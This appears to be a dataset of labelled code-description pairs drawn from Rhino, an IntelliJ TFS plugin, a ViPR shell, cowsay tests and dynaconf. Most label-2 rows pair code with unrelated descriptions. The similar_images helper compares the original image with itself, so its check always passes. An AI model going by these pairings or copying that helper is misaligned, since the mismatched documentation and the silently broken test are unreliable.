1	def compare_figure(example_filename, fig): orig_image_filename = examples.image_filename(example_filename, fig) orig_image = Image.open(orig_image_filename) new_image = examples.make_pil_image(fig) if not similar_images(orig_image, new_image): print(example_filename) orig_image.show() new_image.show() assert False	Compare a figure object with a previously saved image of it. "example_filename" is the filename of the python script used.
1	def compare_text(example_filename, output_text): with open(examples.text_filename(example_filename), 'r') as infile: saved_text = infile.read() assert output_text == saved_text	Compare output text with a previously saved version. "example_filename" is the filename of the python script used.
1	def similar_images(orig_image, new_image, tol=1.0e-6): orig_image = orig_image.convert('RGB') new_image = orig_image.convert('RGB') orig_data = np.array(orig_image, dtype=np.int16) new_data = np.array(new_image, dtype=np.int16) changed = new_data - orig_data changed[np.abs(changed) == 1] = 0 changed = changed.reshape(-1) rms = changed.dot(changed.astype(int)) rms = np.sqrt(rms / changed.size) / 255.0 return rms < tol	Compare two PIL image objects and return a boolean True/False of whether they are similar (True) or not (False). "tol" is a unitless float between 0-1 that does not depend on the size of the images.
2	protected ScriptNode compile(CharSequence source) { final String mainMethodClassName = "Main"; final String scriptClassName = "Main"; CompilerEnvirons compilerEnv = new CompilerEnvirons(); compilerEnv.initFromContext(cx); ErrorReporter compilationErrorReporter = compilerEnv .getErrorReporter(); Parser p = new Parser(compilerEnv, compilationErrorReporter); AstRoot ast = p.parse(source.toString(), "", 1); IRFactory irf = new IRFactory(compilerEnv); ScriptNode tree = irf.transformTree(ast); Codegen codegen = new Codegen(); codegen.setMainMethodClass(mainMethodClassName); codegen.compileToClassFile(compilerEnv, scriptClassName, tree, tree.getEncodedSource(), false); return tree; }	This class implements the "arguments" object. See ECMA 10.1.8
2	public final Object run(Context cx) { this.cx = cx; scope = cx.initStandardObjects(null, true); return run(); }	Returns result expression node (just after opening bracket)
2	public class ArrayComprehensionLoop extends ForInLoop { public ArrayComprehensionLoop() { } public ArrayComprehensionLoop(int pos) { super(pos); } public ArrayComprehensionLoop(int pos, int len) { super(pos, len); } public AstNode getBody() { return null; } public void setBody(AstNode body) { throw new UnsupportedOperationException("this node type has no body"); } public String toSource(int depth) { return makeIndent(depth) + " for " + (isForEach()?"each ":"") + "(" + iterator.toSource(0) + (isForOf()?" of ":" in ") + iteratedObject.toSource(0) + ")"; } public void visit(NodeVisitor v) { if (v.visit(this)) { iterator.visit(v); iteratedObject.visit(v); } } }	Visits this node, the result expression, the loops, and the optional filter.
2	public int getDestructuringLength() { return destructuringLength; }	Returns result expression node (just after opening bracket)
2	public void visit(NodeVisitor v) { if (v.visit(this)) { for (AstNode e : getElements()) { e.visit(v); } } }	Returns filter left paren position, or -1 if no filte
2	public class ArrowFunction extends BaseFunction { static final long serialVersionUID = -7377989503697220633L; private final Callable targetFunction; private final Scriptable boundThis; public ArrowFunction(Context cx, Scriptable scope, Callable targetFunction, Scriptable boundThis) { this.targetFunction = targetFunction; this.boundThis = boundThis; ScriptRuntime.setFunctionProtoAndParent(this, scope); Function thrower = ScriptRuntime.typeErrorThrower(); NativeObject throwing = new NativeObject(); throwing.put("get", throwing, thrower); throwing.put("set", throwing, thrower); throwing.put("enumerable", throwing, false); throwing.put("configurable", throwing, false); throwing.preventExtensions(); this.defineOwnProperty(cx, "caller", throwing, false); this.defineOwnProperty(cx, "arguments", throwing, false); } public Object call(Context cx, Scriptable scope, Scriptable thisObj, Object[] args) { Scriptable callThis = boundThis != null ? boundThis : ScriptRuntime.getTopCallScope(cx); return targetFunction.call(cx, scope, callThis, args); } public Scriptable construct(Context cx, Scriptable scope, Object[] args) { throw ScriptRuntime.typeError1("msg.not.ctor", decompile(0, 0)); } public boolean hasInstance(Scriptable instance) { if (targetFunction instanceof Function) { return ((Function) targetFunction).hasInstance(instance); } throw ScriptRuntime.typeError0("msg.not.ctor"); } public int getLength() { if (targetFunction instanceof BaseFunction) { return ((BaseFunction) targetFunction).getLength(); } return 0; } String decompile(int indent, int flags) { if (targetFunction instanceof BaseFunction) { return ((BaseFunction)targetFunction).decompile(indent, flags); } return super.decompile(indent, flags); } }	Returns the absolute document position of the node. Computes it by adding the node's relative position to the relative positions of all its parents.
2	public int getLength() { return length; }	Returns filter right paren position, or -1 if no filter
2	public void setLength(int length) { this.length = length; }	prefix of all response message IDs
2	public Scope getEnclosingScope() { AstNode parent = this.getParent(); while (parent != null && !(parent instanceof Scope)) { parent = parent.getParent(); } return (Scope)parent; }	Object of this class tell the models when a node belonging to a certain group is active and when no
2	public int compareTo(AstNode other) { if (this.equals(other)) return 0; int abs1 = this.getAbsolutePosition(); int abs2 = other.getAbsolutePosition(); if (abs1 < abs2) return -1; if (abs2 < abs1) return 1; int len1 = this.getLength(); int len2 = other.getLength(); if (len1 < len2) return -1; if (len2 < len1) return 1; return this.hashCode() - other.hashCode(); }	Created by evgeny on 6/10/14
2	protected?void printList(List?items, StringBuilder sb) { int max = items.size(); int count = 0; for (AstNode item : items) { sb.append(item.toSource(0)); if (count++ < max-1) { sb.append(", "); } else if (item instanceof EmptyExpression) { sb.append(","); } } }	It will be restarted your view
2	public void visitComments(NodeVisitor visitor) { if (comments != null) { for (Comment c : comments) { visitor.visit(c); } } }	how often TTL check (discarding old messages) is performed
2	public void visitAll(NodeVisitor visitor) { visit(visitor); visitComments(visitor); }	should messages that final recipient marks as delivered be deleted from message buffer
2	public boolean hasInstance(Scriptable instance) { Object protoProp = ScriptableObject.getProperty(this, "prototype"); if (protoProp instanceof Scriptable) { return ScriptRuntime.jsDelegatesTo(instance, (Scriptable)protoProp); } throw ScriptRuntime.typeError1("msg.instanceof.bad.prototype", getFunctionName()); }	connection(s) that are currently used for sending
2	public Object execIdCall(IdFunctionObject f, Context cx, Scriptable scope, Scriptable thisObj, Object[] args) { if (!f.hasTag(FUNCTION_TAG)) { return super.execIdCall(f, cx, scope, thisObj, args); } int id = f.methodId(); switch (id) { case Id_constructor: return jsConstructor(cx, scope, args); case Id_toString: { BaseFunction realf = realFunction(thisObj, f); int indent = ScriptRuntime.toInt32(args, 0); return realf.decompile(indent, 0); } case Id_toSource: { BaseFunction realf = realFunction(thisObj, f); int indent = 0; int flags = Decompiler.TO_SOURCE_FLAG; if (args.length != 0) { indent = ScriptRuntime.toInt32(args[0]); if (indent >= 0) { flags = 0; } else { indent = 0; } } return realf.decompile(indent, flags); } case Id_apply: case Id_call: return ScriptRuntime.applyOrCall(id == Id_apply, cx, scope, thisObj, args); case Id_bind: if ( !(thisObj instanceof Callable) ) { throw ScriptRuntime.notFunctionError(thisObj); } Callable targetFunction = (Callable) thisObj; int argc = args.length; final Scriptable boundThis; final Object[] boundArgs; if (argc > 0) { boundThis = ScriptRuntime.toObjectOrNull(cx, args[0], scope); boundArgs = new Object[argc-1]; System.arraycopy(args, 1, boundArgs, 0, argc-1); } else { boundThis = null; boundArgs = ScriptRuntime.emptyArgs; } return new BoundFunction(cx, scope, targetFunction, boundThis, boundArgs); } throw new IllegalArgumentException(String.valueOf(id)); }	Returns the first value of the attribute encountered. This method should be used with caution, as the result is random if there are different values of the same attribute in play.
2	public void setImmunePrototypeProperty(Object value) { if ((prototypePropertyAttributes & READONLY) != 0) { throw new IllegalStateException(); } prototypeProperty = (value != null) ? value : UniqueTag.NULL_VALUE; prototypePropertyAttributes = DONTENUM | PERMANENT | READONLY; }	Describes a node's activity time
2	public Object call(Context cx, Scriptable scope, Scriptable thisObj, Object[] args) { return Undefined.instance; }	Sets the application ID. Should only set once when the application is created. Changing the value during simulation runtime is not recommended unless you really know what you're doing
2	public Scriptable createObject(Context cx, Scriptable scope) { Scriptable newInstance = new NativeObject(); newInstance.setPrototype(getClassPrototype()); newInstance.setParentScope(getParentScope()); return newInstance; }	type mySimpleApp.type = SimpleApplication Group.application Group1.application = mySimpleApp
2	public void addStatement(AstNode statement) { addChild(statement); }	Closes the input file streams of the reader.
2	public class Block extends AstNode { { this.type = Token.BLOCK; } public Block() { } public Block(int pos) { super(pos); } public Block(int pos, int len) { super(pos, len); } public void addStatement(AstNode statement) { addChild(statement); } public String toSource(int depth) { StringBuilder sb = new StringBuilder(); sb.append(makeIndent(depth)); sb.append("{\n"); for (Node kid : this) { sb.append(((AstNode)kid).toSource(depth+1)); } sb.append(makeIndent(depth)); sb.append("}\n"); return sb.toString(); } public void visit(NodeVisitor v) { if (v.visit(this)) { for (Node kid : this) { ((AstNode)kid).visit(v); } } } }	Record occupancy every nth second -setting id ({}). Defines the interval how often (seconds) a new snapshot of buffer occupancy is taken
2	private void saveCurrentCodeOffset() { savedCodeOffset = cfw.getCurrentCodeOffset(); }	Default value for the snapshot interval
2	private void addInstructionCount() { int count = cfw.getCurrentCodeOffset() - savedCodeOffset; addInstructionCount(Math.max(count, 1)); }	returns the current speed of the connection
2	private void addInstructionCount(int count) { cfw.addALoad(contextLocal); cfw.addPush(count); addScriptRuntimeInvoke("addInstructionCount", "(Lorg/mozilla/javascript/Context;" +"I)V"); }	Aborts the transfer of the currently transferred message.
2	public class Boolean_001 { public String BOOLEAN = "BOOLEAN"; public String BOOLEAN_OBJECT = "BOOLEAN_OBJECT"; public String OBJECT = "OBJECT"; public String STRING = "STRING"; public String LONG = "LONG"; public String INT = "INT"; public String SHORT = "SHORT"; public String CHAR = "CHAR"; public String BYTE = "BYTE"; public String DOUBLE = "DOUBLE"; public String FLOAT = "FLOAT"; public String ambiguous( float arg ) { return FLOAT; } public String ambiguous( double arg ) { return DOUBLE; } public String ambiguous( byte arg ) { return BYTE; } public String ambiguous( char arg ) { return CHAR; } public String ambiguous( short arg ) { return SHORT; } public String ambiguous( int arg ) { return INT; } public String ambiguous( long arg ) { return LONG; } public String ambiguous( String arg ) { return STRING; } public String ambiguous( Object arg ) { return OBJECT; } public String ambiguous( Boolean arg ) { return BOOLEAN_OBJECT; } public String ambiguous( boolean arg ) { return BOOLEAN; } public String expect(){ return BOOLEAN; } }	This class controls the movement of bus travellers. A bus traveller belongs to a bus control system. A bus traveller has a destination and a start location. If the direct path to the destination is longer than the path the node would have to walk if it would take the bus, the node uses the bus. If the destination is not provided, the node will pass a random number of stops determined by Markov chains (defined in settings).
2	public class Boolean_002 { public int BOOLEAN = 0; public int BOOLEAN_OBJECT = 1; public int OBJECT = 2; public int STRING = 4; public int LONG = 8; public int INT = 16; public int SHORT = 32; public int CHAR = 64; public int BYTE = 128; public int DOUBLE = 256; public int FLOAT = 512; public int ambiguous( float arg ) { return FLOAT; } public int ambiguous( double arg ) { return DOUBLE; } public int ambiguous( byte arg ) { return BYTE; } public int ambiguous( char arg ) { return CHAR; } public int ambiguous( short arg ) { return SHORT; } public int ambiguous( int arg ) { return INT; } public int ambiguous( long arg ) { return LONG; } public int ambiguous( String arg ) { return STRING; } public int ambiguous( Object arg ) { return OBJECT; } public int ambiguous( Boolean arg ) { return BOOLEAN_OBJECT; } public int expect() { return BOOLEAN_OBJECT; } }	The number of contacts during an inter-contact time metric is similar to the inter-contact times metric, except that instead of measuring the time until a node meets again, we count the number of other nodes both of the nodes meet separately. In contrast to the inter-contact times, the number of contacts during an inter-contact is not symmetric, i.e. during an inter-contact both nodes wait the exact same time but will meet a different number of nodes
2	public void proc() { retrieveGoals(); // This should be done often because goals might change over time retrieveState(); // This should be done often because world state might change over time spreadActivation(); checkIfExecutable(); if (isActive()){ operation(); // operation this behavior should perform } }	retrieves the lists of world and self states from working storage through inputs
2	private void $$$loadLabelText$$$(JLabel component, String text) { StringBuffer result = new StringBuffer(); boolean haveMnemonic = false; char mnemonic = '\0'; int mnemonicIndex = -1; for (int i = 0; i < text.length(); i++) { if (text.charAt(i) == '&') { i++; if (i == text.length()) break; if (!haveMnemonic && text.charAt(i) != '&') { haveMnemonic = true; mnemonic = text.charAt(i); mnemonicIndex = result.length(); } } result.append(text.charAt(i)); } component.setText(result.toString()); if (haveMnemonic) { component.setDisplayedMnemonic(mnemonic); component.setDisplayedMnemonicIndex(mnemonicIndex); } }	Checks for illegal arguments and throws IllegalArgumentException if found
2	private void $$$loadButtonText$$$(AbstractButton component, String text) { StringBuffer result = new StringBuffer(); boolean haveMnemonic = false; char mnemonic = '\0'; int mnemonicIndex = -1; for (int i = 0; i < text.length(); i++) { if (text.charAt(i) == '&') { i++; if (i == text.length()) break; if (!haveMnemonic && text.charAt(i) != '&') { haveMnemonic = true; mnemonic = text.charAt(i); mnemonicIndex = result.length(); } } result.append(text.charAt(i)); } component.setText(result.toString()); if (haveMnemonic) { component.setMnemonic(mnemonic); component.setDisplayedMnemonicIndex(mnemonicIndex); } }	Create the locations.csv file if it doesn't exist or check it for the IDE location. If no location is found or they mismatch, insert the new location into the file
2	public ArtifactID(final String tool, final String artifactType, final String toolSpecificId) { this.tool = tool; this.artifactType = artifactType; this.toolSpecificId = toolSpecificId; }	Create an instance of this class to build up the arguments that should be passed to the Tool. These arguments are logged by the tool runner. If an argument should not be written to the log, Call addSecret instead of add on that argument. This will produce ****** in the log in place of the actual argument value.
2	public enum AuthTypes { CREDS, DEVICE_FLOW; public static AuthTypes getEnum(final String name) { if (DEVICE_FLOW.name().equalsIgnoreCase(name)) { return DEVICE_FLOW; } return CREDS; } }	Returns an NTCredentials object for given username and password
2	public static String getProxyLogin() { try { final Method proxyLoginMethod = HttpConfigurable.getInstance().getClass().getDeclaredMethod(PROXY_LOGIN_METHOD); return (String) proxyLoginMethod.invoke(HttpConfigurable.getInstance(), null); } catch (Exception newImplementationException) { try { logger.warn("Failed to get proxy login using getProxyLogin() so attempting old way", newImplementationException); final Field proxyLoginField = HttpConfigurable.getInstance().getClass().getDeclaredField(PROXY_LOGIN_FIELD); return (String) proxyLoginField.get(HttpConfigurable.getInstance()); } catch (Exception oldImplementationException) { logger.warn("Failed to get proxy login using PROXY_LOGIN field", oldImplementationException); return StringUtils.EMPTY; } } }	All backwards compatible logic is contained in this class to keep it in a central place to track
2	protected BuildStatusLookupOperation(final RepositoryContext repositoryContext, final boolean forcePrompt) { logger.info("BuildStatusLookupOperation created."); ArgumentHelper.checkNotNull(repositoryContext, "repositoryContext"); this.repositoryContext = repositoryContext; this.forcePrompt = forcePrompt; }	This action allows the user to branch the selected file/folder to a new location.
2	private static void readUntilElementEnd(final XMLStreamReader reader) throws XMLStreamException { int event = reader.getEventType(); int elementDepth = 1; boolean firstTime = true; while (true) { switch (event) { case XMLStreamConstants.START_ELEMENT: if (firstTime) { firstTime = false; } else { elementDepth++; } break; case XMLStreamConstants.END_ELEMENT: elementDepth--; if (elementDepth < 1) { return; } break; default: } event = reader.next(); } }	Adds changes to change log as the correct status
2	private void $$$loadLabelText$$$(JLabel component, String text) { StringBuffer result = new StringBuffer(); boolean haveMnemonic = false; char mnemonic = '\0'; int mnemonicIndex = -1; for (int i = 0; i < text.length(); i++) { if (text.charAt(i) == '&') { i++; if (i == text.length()) break; if (!haveMnemonic && text.charAt(i) != '&') { haveMnemonic = true; mnemonic = text.charAt(i); mnemonicIndex = result.length(); } } result.append(text.charAt(i)); } component.setText(result.toString()); if (haveMnemonic) { component.setDisplayedMnemonic(mnemonic); component.setDisplayedMnemonicIndex(mnemonicIndex); } }	The getPreferredFocusedComponent method returns the control that should get the initial focus.
2	public interface CheckoutPageModel extends LoginPageModel { String PROP_DIRECTORY_NAME = "directoryName"; String PROP_LOADING = "loading"; String PROP_ADVANCED = "advanced"; String PROP_PARENT_DIR = "parentDirectory"; String PROP_REPO_FILTER = "repositoryFilter"; String PROP_REPO_TABLE = "repoTable"; String DEFAULT_SOURCE_PATH = System.getProperty("user.home"); String getParentDirectory(); void setParentDirectory(String parentDirectory); String getDirectoryName(); void setDirectoryName(String directoryName); String getRepositoryFilter(); void setRepositoryFilter(String repositoryFilter); boolean isLoading(); void setAdvanced(boolean advanced); boolean isAdvanced(); void setLoading(boolean loading); void setCloneEnabled(boolean cloneEnabled); ServerContextTableModel getTableModel(); ListSelectionModel getTableSelectionModel(); void loadRepositories(); void cloneSelectedRepo(); }	This class binds the UI with the Model by attaching listeners to both and keeping them in sync.
2	protected CheckoutModel getParentModel() { return parentModel; }	This class is the overall model for the Checkout dialog UI. It manages the 2 other models for VSO and TFS.
2	protected boolean isMemoryException(final String output) { if (output.replace("\r\n", "\n").contains(ToolMemoryException.getErrorMsg())) { logger.warn("Memory error found for TF tool"); return true; } return false; }	Default method for parsing return code that can be overridden if need be
2	public static PendingChange getStatusForFile(final ServerContext context, final String file) { final Command<list> command = new StatusCommand(context, file); final List?results = command.runSynchronously(); return results.isEmpty() ? null : results.get(0); }</list	This test makes sure that output from a command is flushed before the completion event is fired.
2	def do_quit(self, args): logger.info("CMD: quit") self.do_logout(args) print("Quitting.") raise SystemExit	Boyomi-chan client. Boyomi-chan is Japnanese speech server.
2	def do_ls(self, args): logger.info("CMD: ls %s" % args) try: if args: if args.startswith('/'): temp_context = self.__get_context_for_path(args[1:], self._context) else: temp_context = self.__get_context_for_path(args, curr_context) else: temp_context = curr_context if temp_context: sub_context = list(temp_context.keys()) actions_dict = None if ACTIONS_KEY in temp_context: actions_dict = temp_context[ACTIONS_KEY] sub_context.remove(ACTIONS_KEY) if ID_KEY in temp_context and BULK_KEY in temp_context: sub_context.remove(ID_KEY) try: cookie = self.__get_cookie() response = ViPRConnection.submitHttpRequest('GET', curr_path+"/bulk", cookie) if response: self.__print_bulk_response(response.text) except Exception as e: print(str(e)) logger.error(str(e)) elif ID_KEY in temp_context and ACTIONS_KEY in temp_context and 'GET' in temp_context[ACTIONS_KEY]: sub_context.remove(ID_KEY) try: cookie = self.__get_cookie() response = ViPRConnection.submitHttpRequest('GET', curr_path, cookie) if response: self.__print_get_all_response(response.text) except Exception as e: print(str(e)) logger.error(str(e)) print(' '.join(sub_context)) if actions_dict: print('\nActions:-') print(' '.join(actions_dict.keys())) else: print('Wrong path') except Exception as e: print(str(e))	Returns the timestamp of the beginning of this video in sec.
2	def do_ll(self, args): logger.info("CMD: ll %s" % args) try: if args: if args.startswith('/'): temp_context = self.__get_context_for_path(args[1:], self._context) else: temp_context = self.__get_context_for_path(args, curr_context) else: temp_context = curr_context if temp_context: sub_context = list(temp_context.keys()) actions_dict = None if ACTIONS_KEY in temp_context: actions_dict = temp_context[ACTIONS_KEY] sub_context.remove(ACTIONS_KEY) if ID_KEY in temp_context and BULK_KEY in temp_context: sub_context.remove(ID_KEY) try: cookie = self.__get_cookie() response = ViPRConnection.submitHttpRequest('GET', curr_path+"/bulk", cookie) if response: detail_response = ViPRConnection.submitHttpRequest('POST', curr_path+"/bulk", cookie, payload=response.text) if detail_response: self.__print_ll_response(detail_response.text) except Exception as e: print(str(e)) logger.error(str(e)) elif ID_KEY in temp_context and ACTIONS_KEY in temp_context and 'GET' in temp_context[ACTIONS_KEY]: sub_context.remove(ID_KEY) try: cookie = self.__get_cookie() response = ViPRConnection.submitHttpRequest('GET', curr_path, cookie) if response: self.__print_ll_response(response.text) except Exception as e: print(str(e)) logger.error(str(e)) print(' '.join(sub_context)) if actions_dict: print('\nActions:-') print(' '.join(actions_dict.keys())) else: print('Wrong path') except Exception as e: print(str(e)) logger.error(str(e))	Applies the current changes, and saves them to the file.
2	def do_cd(self, args): logger.info("CMD: cd %s" % args) global curr_context, curr_path if args: if args == '..': last_index = curr_path.rfind('/') if last_index == 0: last_index = 1 args = curr_path[:last_index] if args.startswith('/'): temp_context = self.__get_context_for_path(args[1:], self._context) if temp_context: curr_context = temp_context if args != '/': curr_path = args else: curr_path = '' else: print('Wrong path') logger.error("Wrong path %s" % args) else: temp_context = self.__get_context_for_path(args, curr_context) if temp_context: curr_context = temp_context curr_path += '/' + args else: print('Wrong path') logger.error("Wrong path %s" % args) self.prompt = 'ViPRCommand:' + curr_path + '/>' return	Cancels the current changes, and reloads the saved changes.
2	def do_GET(self, args): logger.info("CMD: GET %s" % args) try: if ACTIONS_KEY not in curr_context: print('GET is not available') return actions_dict = curr_context[ACTIONS_KEY] if 'help' == args: if actions_dict['GET']: CommonUtil.print_query_params(actions_dict['GET'].query_params) return cookie = self.__get_cookie() args_dict = self.__convert_args_to_dict(args) query_str = '' if actions_dict['GET'] and actions_dict['GET'].query_params: query_str = self.__process_return_query_params(args_dict, actions_dict['GET'].query_params) accept_type = args_dict[RESPONSE_TYPE_KEY] if RESPONSE_TYPE_KEY in args_dict else '' response = ViPRConnection.submitHttpRequest('GET', curr_path+query_str, cookie, xml=True if accept_type == RESPONSE_TYPE_XML else False) if response: self.__print_response(response.text, accept_type) except Exception as e: print(str(e)) logger.error(str(e))	Check the image size and check if the image is already cropped.
2	def do_POST(self, args): logger.info("CMD: POST %s" % args) global execute_action try: if ACTIONS_KEY not in curr_context: print('POST is not available') return actions_dict = curr_context[ACTIONS_KEY] if execute_action: curr_action = execute_action else: curr_action = 'POST' if 'help' == args: if actions_dict[curr_action]: CommonUtil.print_query_params(actions_dict[curr_action].query_params) CommonUtil.print_attributes(actions_dict[curr_action].method_name) return post_payload, query_str, content_type = self.__process_args(args, actions_dict[curr_action]) cookie = self.__get_cookie() if execute_action: post_url = curr_path + '/' + execute_action else: post_url = curr_path response = ViPRConnection.submitHttpRequest('POST', post_url+query_str, cookie, payload=post_payload, contentType=content_type) if response: self.__print_response(response.text) except Exception as e: print(str(e)) logger.error(str(e))	Returns the path prepended the top dir and appened subdirs.
2	def do_PUT(self, args): logger.info("CMD: PUT %s" % args) try: if ACTIONS_KEY not in curr_context: print('PUT is not available') return actions_dict = curr_context[ACTIONS_KEY] if 'help' == args: if actions_dict['PUT']: CommonUtil.print_query_params(actions_dict['PUT'].query_params) CommonUtil.print_attributes(actions_dict['PUT'].method_name) return put_payload, query_str, content_type = self.__process_args(args, actions_dict['PUT']) cookie = self.__get_cookie() response = ViPRConnection.submitHttpRequest('PUT', curr_path+query_str, cookie, payload=put_payload, contentType=content_type) if response: self.__print_response(response.text) except Exception as e: print(str(e)) logger.error(str(e))	Returns the current time in sec considering the epoch time.
2	def do_login(self, args): logger.info("CMD: login %s" % args) if not args: print("login -username name -password pswd") else: try: args_arr = args.split() if args_arr[0] == "help": print("login -username name -password pswd") return cookie = ViPRConnection.login(args_arr[1], args_arr[3]) if cookie: with open(os.path.join(ConfigUtil.COOKIE_DIR_ABS_PATH, COOKIE_FILE_NAME), 'w+') as f: f.write(cookie) except Exception as e: print(str(e)) logger.error(str(e))	Find the "vs" character betweeen our team's inklinks and the other's. Returns x_pos value (offset from self.meter_x1), if succeeded ins detecteding the position. Otherwise False. Detection may fail in some scenes (e.g. at the beginning of the game, and low-quality input)
2	def do_logout(self, args): cookie = None logger.info("CMD: logout") try: try: cookie = self.__get_cookie() except Exception as e: logger.info("Cookie not found") pass if cookie: print("Logging out") logger.info("Logging out user") ViPRConnection.logout(cookie) os.remove(os.path.join(ConfigUtil.COOKIE_DIR_ABS_PATH, COOKIE_FILE_NAME)) except Exception as e: print(str(e)) logger.error(str(e))	To reduce false-positive detection, it also checks the pixel of the squid. Since it's body should be colored (not white or black), it ignores eye pixels without colored body pixels.
2	def do_find(self, args): logger.info("CMD: find %s" % args) if not args: return args_arr = args.split() find_me = args_arr[0] found_paths = list() CommonUtil.find_paths(found_paths, self._context, find_me) print('\n'.join(found_paths))	In this state, player is just wondering in the stage, or testing weapons. No inklings are shown.
2	def completedefault(self, text, line, begidx, endidx): if not text or text == '/': completions = list(self._context.keys()) else: if text.startswith('/'): completions = self.__get_completions_for_partial_path(text[1:], self._context, True) else: completions = self.__get_completions_for_partial_path(text, curr_context) return completions	Returns the offset time in msec since the game start.
2	def get_config(): conf=yaml.load(open(os.environ.get('CONFIGFILE','/dev/null'))) if conf is None: conf=dict() return ConfigManager( [ ConfigOSEnv(), ConfigDictEnv(conf), ] )	read a frame from the input. The device should have been activated by select_device() method.
2	public void testSetTongue() { System.out.println("setTongue"); String tongue = "V"; CowExecutor instance = new CowExecutor(); instance.setTongue(tongue); String expResult = CowsayTest.loadExpected("cowsayTongue.txt"); instance.setMessage("Hello"); String result = instance.execute(); Assert.assertEquals(expResult, result); }	Creates a new connection to the specified ThoughtTreasure server. The IANA-listed registered port number is assumed.
2	public void testSetWrap() { System.out.println("setWrap"); String wrap = "2"; CowExecutor instance = new CowExecutor(); instance.setWrap(wrap); String expResult = CowsayTest.loadExpected("cowsayWrap2.txt"); instance.setMessage("Hello"); String result = instance.execute(); Assert.assertEquals(expResult, result); }	Tests whether the specified object is of the specified class.
2	public void testSetMessage() { System.out.println("setMessage"); CowExecutor instance = new CowExecutor(); instance.setMessage("Hello"); String result = instance.execute(); String expResult = CowsayTest.loadExpected("cowsayHello.txt"); Assert.assertEquals(expResult, result); }	Returns the descendants of the specified object.
2	public void testSetMode() { CowExecutor instance = new CowExecutor(); instance.setMessage("Hello"); Set?modes = CowsayTest.modeMap.keySet(); for (String key : modes) { System.out.println("setMode " + key); String expResult = CowsayTest.loadExpected(CowsayTest.modeMap.get(key)); instance.setMode(key); String result = instance.execute(); Assert.assertEquals(expResult, result); } }	Retrieves assertions from the database matching the specified pattern. Returns a Vector of Java Objects representing ThoughtTreasure assertions.
2	public void testSay() { System.out.println("cowsay Hello"); String[] args = new String[]{"Hello"}; String expResult = loadExpected("cowsayHello.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	Returns the objects (atomic concepts) for the specified word or phrase (lexical entry) in the lexicon.
2	public void testSayManyWords() { System.out.println("cowsay foo bar baz"); String[] args = new String[]{"foo", "bar", "baz"}; String expResult = loadExpected("cowsayFooBarBaz.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	Syntactically parses the specified natural language text. Returns a Vector of Java Objects representing parse trees.
2	public void testSayManyWordsOneArg() { System.out.println("cowsay foo bar baz"); String[] args = new String[]{"foo bar baz"}; String expResult = loadExpected("cowsayFooBarBaz.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	Generates the specified ThoughtTreasure assertion in natural language.
2	public void testCowthinkArg() { System.out.println("cowsay --cowthink Hello"); String[] args = new String[]{"--cowthink", "Hello"}; String expResult = loadExpected("cowthinkHello.txt"); CowsayCli.addCowthinkOption(); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	Sends natural language input text to the chatterbot and returns the natural language response.
2	public void testSayWrap2() { System.out.println("cowsay -W 2 Hello"); String[] args = new String[]{"-W", "2", "Hello"}; String expResult = loadExpected("cowsayWrap2.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	Forces ThoughtTreasure to break out of the server select loop, so that it can process further ThoughtTreasure shell commands.
2	public void testSayNowrap() { System.out.println("cowsay -n msg"); String[] args = new String[]{"-n", "Moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo moo"}; String expResult = loadExpected("cowsayLong.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	A ThoughtTreasure parse node, representing information about a textual entity (such as a word or phrase) in a text.
2	public void testSayWithNamedFile() { System.out.println("cowsay -f tux Hello"); String[] args = new String[]{"-f", "tux", "Hello"}; String expResult = loadExpected("cowsayTux.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	The end position of the textual entity in the text.
2	public void testSayWithNamedFileNotFound() { System.out.println("cowsay -f abcdefgzzzblah Hello"); String[] args = new String[]{"-f", "abcdefgzzzblah", "Hello"}; String expResult = loadExpected("cowsayHello.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	A particular inflection of the lexical entry, such as the third-person singular form of a verb.
2	public void testSayModes() { Set?modes = modeMap.keySet(); for (String key : modes) { String[] args = new String[]{'-' + key, "Hello"}; System.out.println("cowsay -" + key + " Hello"); String expResult = loadExpected(modeMap.get(key)); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); } }	The citation form of the lexical entry, such as the infinitive form of a verb or the singular form of a noun.
2	public void testSayEyes() { System.out.println("-e QQ cowsay"); String[] args = new String[]{"-e", "QQ", "Hello"}; String expResult = loadExpected("cowsayEyes.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	A link between a ThoughtTreasure lexical entry and a ThoughtTreasure object. That is, a word-meaning association.
2	public void testSayEyesDollars() { System.out.println("-e $$ cowsay"); String[] args = new String[]{"-e", "$$", "Hello"}; String expResult = loadExpected("cowsayGreedy.txt"); String result = Cowsay.say(args); Assert.assertEquals(expResult, result); }	A word-meaning association found for the textual entity in the text.
2	def __init__(self, _settings, *args, **kwargs): super(DynaconfConfig, self).__init__(*args, **kwargs) Config.update(self, _settings.store) self._settings = _settings	Set num_samples, num_mega_batches, num_features Read one file and set num_features, etc. This is a bit underoptimized. We end up loading the first set of files twice - once here and once at start of pretraining.
2	def configured(self): return self._wrapped is not empty	Read binary imnet infile and write to outfile
2	def _setup(self): environment_variable = self._kwargs.get( 'ENVVAR_FOR_DYNACONF', default_settings.ENVVAR_FOR_DYNACONF) settings_module = os.environ.get(environment_variable) self._wrapped = Settings( settings_module=settings_module, **self._kwargs )	Load data from main memory to theano shared variable.
2	def __setattr__(self, name, value): try: self._deleted.discard(name) except AttributeError: pass super(Settings, self).__setattr__(name, value)	This is just a base class for the proxy class created in the closure of the lazy function. It can be used to recognize promises in code.
2	def using_env(self, env, clean=True, silent=True, filename=None): try: self.setenv(env, clean=clean, silent=silent, filename=filename) self.logger.debug("In env: %s", env) yield finally: if env.lower() != self.ENV_FOR_DYNACONF.lower(): del self.loaded_envs[-1] self.logger.debug("Out env: %s", env) self.setenv(self.current_env, clean=clean, filename=filename)	Unambiguously identify this string-based representation of Missing, used as a singleton.
2	def raw_logger(): level = os.environ.get('DEBUG_LEVEL_FOR_DYNACONF', 'ERROR') try: from logzero import setup_logger return setup_logger( "dynaconf", level=getattr(logging, level) ) except ImportError: logger = logging.getLogger("dynaconf") logger.setLevel(getattr(logging, level)) return logger	To keep backwards compat change the kwargs to new names
